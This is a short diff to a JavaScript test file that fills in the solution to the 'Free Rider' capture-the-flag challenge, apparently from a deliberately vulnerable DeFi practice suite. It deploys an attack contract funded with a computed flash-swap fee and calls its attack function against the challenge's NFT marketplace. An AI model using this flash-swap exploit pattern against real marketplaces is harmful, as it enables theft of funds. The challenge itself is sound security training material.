@@ -106,6 +106,20 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const FLASH_SWAP_FEE = ((NFT_PRICE * 3n) / 997n) + 1n;
+
+        let attackFreeRider = await (await ethers.getContractFactory('AttackFreeRider', player)).deploy(
+            uniswapPair.address,
+            uniswapFactory.address,
+            marketplace.address,
+            devsContract.address,
+            nft.address,
+            [0, 1, 2, 3, 4, 5],
+            player.address,
+            {value: FLASH_SWAP_FEE}
+        );
+
+        await attackFreeRider.attack()
     });
 
     after(async function () {
